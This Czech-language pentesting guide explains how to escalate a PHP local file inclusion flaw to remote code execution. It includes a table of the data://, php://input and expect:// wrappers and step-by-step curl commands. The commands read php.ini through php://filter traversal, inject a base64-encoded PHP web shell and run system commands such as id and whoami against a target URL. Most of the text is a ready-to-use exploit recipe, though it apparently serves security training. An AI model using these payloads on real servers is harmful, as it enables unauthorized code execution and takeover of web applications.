Využití PHP wrapperů umožňuje převést LFI zranitelnost přímo na Remote Code Execution (RCE). Pro použití wrapperů `data://` a `php://input` je nutné, aby byla v konfiguraci PHP (`php.ini`) povolena směrnice `allow_url_include = On`.

**Přehled PHP wrapperů pro získání RCE**

|**Wrapper**|**Prerekvizity**|**Princip předání payloadu**|**Příklad použití**|
|---|---|---|---|
|**`data://`**|`allow_url_include = On`|Base64 kódovaný PHP skript předaný přímo v URL.|`language=data://text/plain;base64,PD9waHAg...&cmd=id`|
|**`php://input`**|`allow_url_include = On` + akceptace POST|PHP kód odeslaný v těle POST požadavku.|`curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target/index.php?language=php://input&cmd=id"`|
|**`expect://`**|Nainstalovaný modul `expect`|Přímé spuštění systémového příkazu přes URL stream.|`language=expect://id`|

**Detailní postup realizace**

- **1. Ověření konfigurace (`php.ini`)**
    
    Před použitím `data://` nebo `php://input` ověřte stav `allow_url_include` stažením konfiguračního souboru (např. `/etc/php/7.4/apache2/php.ini`) pomocí `php://filter`:
    
    Bash
    
    ```
    curl -s "http://target/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | base64 -d | grep allow_url_include
    ```
    
- **2. Spuštění kódu přes `data://`**
    
    Zakódujte základní PHP web shell do Base64:
    
    Bash
    
    ```
    echo '<?php system($_GET["cmd"]); ?>' | base64
    # Výstup: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
    ```
    
    Odešlete požadavek s kódovaným shellu a parametrem `cmd`:
    
    Bash
    
    ```
    curl -s 'http://target/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
    ```
    
- **3. Spuštění kódu přes `php://input`**
    
    Pokud zranitelný parametr přijímá POST data, pošlete skript přímo v těle požadavku:
    
    Bash
    
    ```
    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target/index.php?language=php://input&cmd=whoami"
    ```
    
- **4. Přímé příkazy přes `expect://`**
    
    Pokud je na serveru aktivní rozšíření `expect` (`extension=expect` v `php.ini`),ze spustit příkazy bez nutnosti vkládat web shell:
    
    Bash
    
    ```
    curl -s "http://target/index.php?language=expect://id"
    ```